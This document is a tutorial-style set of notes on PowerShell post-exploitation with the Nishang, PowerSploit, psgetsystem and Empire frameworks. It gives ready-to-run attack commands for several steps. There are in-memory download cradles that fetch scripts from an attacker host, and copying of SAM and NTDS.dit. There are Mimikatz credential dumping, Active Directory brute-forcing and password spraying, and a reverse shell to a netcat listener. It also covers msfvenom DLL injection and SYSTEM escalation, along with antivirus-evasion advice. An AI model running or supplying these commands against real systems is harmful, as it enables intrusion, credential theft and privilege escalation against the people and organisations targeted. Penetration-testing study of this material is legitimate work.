

# Post Exploitation with PowerShell


Lets explore some other tools we can utilize for Post-Exploitation, which is where our ability to leverage
PowerShell really starts to shine



First lets explore another excellent post exploitation framework, known as Nishang, by Nikhil Mittal

Nishang brings together some of the best tools from other frameworks, in addition to Nishang-native tools
as well


# Important

As we mentioned previously about AV and the detection of PowerShell and other exploitation frameworks,
Nishang is no exception, and its various modules will likely be detected if imported directly to the target
system

Therefore, its important to make sure that most of the tools and scripts we invoke get invoked via download
cradles that support in-memory execution. For most of the examples that follow, we'll be using the 
Net.WebClient and DownloadString method to execute our scripts in memory

Once we've hosted the Nishang framework scripts on our attacker machine, we can begin



# Nishang - Gather

These Gather modules will help us get information from our target system locally, that we could potentially
use to move laterally for instance


The Copy-VSS module wil attempt to copy the SAM database using the VSS service, and if run on a domain
controller, will try and copy the NTDS.dit and contents of the system registry hive

We can try it with the following command

PS C:\> iex (New-Object Net.WebClient).DownloadString("http://attacker_url/copy-vss.ps1"); Copy-VSS


The command shown above will copy the contents of the SYSTEM registry hive and the SAM file to the current
working directory on the target

These can be cracked offline



The Get Information cmdlet will get us a good deal of system information including:

PuTTY trusted hosts
PuTTY Saved sessions
Recently used commands
Shares on the target machine
Environment Variables
Current user details
SNMP information
Installed applications
Domain Name
Contents of hosts file
Running Services
Account Policy
Local Users
Local Groups
WLAN Info


We can download it and execute it in memory with our Net.WebClient DownloadString download cradle:

iex (New-Object Net.WebClient).DownloadString('http://attacker/Get-Information.ps1'); Get-Information



Get-PassHints we can use to dump the saved Password Hints for users on the system

iex (New-Object Net.WebClient).DownloadString('http://attacker/Get-PassHints'); Get-PassHints



The Invoke-Mimikatz cmdlet will dump clear text credentials (or hashes) from memory. Note, that we can also 
pass command line parameters to any of the modules that have additional options as part of our download
cradle commands: 

iex (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz'); Invoke-Mimikatz -DumpCreds

There are plenty of other gather modules which will come in handy for our post-exploitation purposes:

https://github.com/samratashok/nishang#gather



# Nishang Brute-Forcing MSSQL, Active Directory, WEB, and FTP



As part of its catalog, Nishang includes a great brute force tool called Invoke-BruteForce. We
can use this to brute Active Directory accounts, SQL servers, Web or ftp servers. The great thing about a
brute force tool written in PowerShell is that we can execute the attack from our target host as long as
we copy a file containing usernames and passwords to our target


PS C:\> Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\temp\users.txt -PasswordList C:\temp/pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose


Invoke-BruteForce is also a great tool for executing a password spray attack against Active Directory

Just ensure that your password list contains a single password


# Reverse PowerShell Shell (NetCat)

The Invoke-PowerShellTcp cmdlet within the Nishang framework provides an excellent way to obtain a 
reverse PowerShell Shell from our target host back to a netcat listener

keep in mind if using this method, that the traffic is traversing the wire in cleartext between attacker
and target


Although a great and undetected (by antivirus) method to get a reverse shel from PowerShell, over-the-wire
heuristics (SIEM) may pick up some of the back and forth chatter if that type of solution has been
implemented within an organization

To use this, we should first fire up a NetCat listener on our attacker machine

We will configure it on port 4444 for this example

nc -lvnp 4444


Next we can simply invoke it using a download cradle from the target system, this time, from a windows
command prompt on the target

C:\> powershell.exe -Command iex (New-Object Net.WebClient).DownloadString('http://attacker_URL/Invoke_PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAdress <listener_IP> -port 4444


On our listener we should recieve a connect back from the target into a PowerShell prompt


There are several different shells, both bind, reverse, ICMP, UDP shells, and some more complex "rat"-type
shells we can utilize from Nishang:

Invoke-JSRatRegsvr.ps1
Invoke-JSRatRundll.ps1
Invoke-PoshRatHttp.ps1
Invoke-PoshRatHttps.ps1
Invoke-PowerShellcmp.ps1
Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcpOneLine.ps1
Invoke-PowerShellTcpOneLineBind.ps1
Invoke-PowerShellUdp.ps1
Invoke-PowerShellUdpOneLine.ps1
Invoke-PowerShellWmi.ps1
Invoke-PsGcat.ps1
Invoke-PsGcatAgent.ps1
Remove-PoshRat.ps1



In addition to the Gather and other modules we've covered, we can find a script for mostly any phase of our
post-exploitation within the Nishang Framework with utilities in the following categories: 

Active Directory 	Escalation		Pivot
Antak-WebShell		Execution 	Prasadhak
Backdoors		    Gather		Scan
Bypass				MITM 		Shells
Client 				Misc		Utility



# PowerSploit for Post-Exploitation


As with other frameworks, with PowerSploit there are several categories we can use for our post-exploitation
purposes

AntivirusBypass
Code Execution
Exfiltration
Mayhem
Persistence
Privesc
Recon
ScriptModification



# PowerUp Module


One which we should cover here and offers a good starting point in the identification of misconfigs, is the
PowerUp module within the Privesc category

We can first import the Privesc.psm1 module from within the Privesc modules directory and have a look at some
of the options we have 

PS C:\Modules\PowerSploit\Privesc> Import-Module .\Privesc.psm1


PS C:\> Get-Command -Module Privesc


After running the previous command we can see that the PowerUp module has plenty of options for us to
explore. Of course we can run any of those functions or scripts, but this module includes an Invoke-AllChecks
function

Invoke-AllChecks will run all functions related to the Privesc module looking for misconfigurations,
permissions issues with services, opportunities for DLL hijacking a number of useful checks

We can invoke it on the target after we've imported the Prives.psm1 module with the following command

PS C:\> Invoke-AllChecks


The output will also indicate an AbuseFunction we can use to further exploit the target. In the case with
the following example (screenshot in folder) PowerUp indentified a potential service binary we can install 
with the Install-ServiceBinary -Name'ClickToRunSvc' command


PowerUp also gives the option to save all results to an HTML file with the -HTMLReport flag and will
generate an HTML file we can use to investigate any paths to privilege escalation

The file will be saved in the current directory Invoke-AllChecks was run from and will be in
"MACHINENAME.USERNNAME.html" naming format

PS C:\> Invoke-AllChecks -HTMLReport


# DLL Injection

The CodeInjection category in PowerSploit gives us some options in regard to several methods we can inject 
our own code into existing processes on the target system, whether it be via DLL Injection, injection our 
own custom Shellcode into an existing process, or using WMI to execute commands on the target

The one we will cover here is the Invoke-DLLInjection script as it is the most commonly used

this function injects an attacker-defined DLL into any existing process ID on the target system


the first requirement, of course, is that we generate a DLL for demonstration purposes

This can be done a number of ways, but most commonly, we can just use Metasploits msfvenom to generate
one with the following command:


msfvenom -p windows/exec CMD="cmd.exe" -f dll > cmd.dll

This command will simply execute a cmd.exe prompt on the target when injected

In our exploration of the tool, we can create a dll that will spawn a meterpreter reverse shell
for instance


The DLL will need to be downloaded to the target. This can be done in any number of ways qwe've covered
before in this module

We can use the Net.WebClient"DownloadFile download cradle method for that

PS C:\> iex (New-Object Net.WebClient).DownloadFile('http://attacker_url/cmd.dll', 'C:\programdata\cmd.dll')


we should identify a process on the target system we'd like to inject our DLL into. We can simply run
the ps command from the PowerShell console

In this example, we'll run the ps command with a where-object statement to look for a process 
that matches "notepad", and we'll inject our DLL into that process


//space after underscore to remove italics in this md doc
PS C:\> ps | ? {_ .ProcessName -match "notepad"} 


Once we've downloaded our DLL to the target, and identified the process we're going to inject into, 
such as "notepad.exe process ID 7420", we cna use another download cradle (this time the "DownloadString"
method) to download and execute the Invoke-DLLInjection.ps1 script from our attacker system, along with 
the correct arguments for injecting our DLL into that existing process


PS C:\> iex (New-Object Net.WebClient).DownloadString('http://attacker_url/Invoke-DLLInjection.ps1'); Invoke-DLLInjection -ProcessID 7420 C:\programdata\cmd.dll


Once that is complete, if we run the ps command again, we can confirm that we now have a cmd process
which has been spawned from our DLL injection operation, which is created in a new process thread



# A great explanation of the basics of how DLL injection works can be found here 

http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html



# Psgetsystem

another great tool by decoder-it is psgetsystem and can be downloaded here: 

https://github.com/decoder-it/psgetsystem



Psgetsystem allows us to get SYSTEM privileges via a parent process, which then spawns a child process
which effectively inherits the SYSTEM access privileges of the parent

Although this tool needs to be run as Administrator, it's a great way to evade application whitelisting
solutions by being able to inject ourselves into an already signed or other trusted process

Once we've downloaded the psgetsystem.ps1 script to our target, we can source it and execute its class
function with the following commands:

PS C:\> . .\psgetsystem.ps1
PS C:\> [MyProcess]::CreateProcessFromParent(<system_pid>, "<command_to_execute>")


But before we do that we need to identify some SYSTEM processes and choose one we can "piggyback"
onto

We can use the following command to find those


//space after underscore to remove italics in this md doc
PS C:\> Get-Process -IncludeUserName | Where-Object {$_ .UserName -match "SYSTEM"} |Format-List -Property UserName,Name,Id


That should return a list of all SYSTEM-owned processes along with their PID's and process names


We'll use "ZeroConfigService" for this example


Now that we have a PID for a system-owned process (3632 in this case), we can continue with our execution
of psgetsystem

For demonstration purposes, we'll instruct psgetsystem to run cmd.exe within the ZeroConfigService.exe
process, and as a result our child process will also be system

PS C:\> . .\psgetsys.ps1
PS C:\> [MyProcess]::CreateProcessParent(3632, "cmd.exe")

We can confirm this by running a tool like Process Explorer, to see that our cmd.exe process
has been spawned as a child process of the ZeroConfigService process and is also SYSTEM


In an attack scenario we could easily launch a meterpreter executable payload as SYSTEM and get a 
system shell from the target machine

# Empire

Empire is another great post-exploitation framework which we'll briefly describe here but will go further into depth in a video lesson


Its main advantage is that it implements PowerShell functionality without requiring the existence 
of PowerShell on a target machine

It is in a world of its own in regard to other frameworks in that it utilizes its own built-in listeners,
agents and modules to compromise and conduct all facets of post-exploitation from information gathering
to privilege escalation, lateral movement, persistence and also integrates with the Metasploit Framework

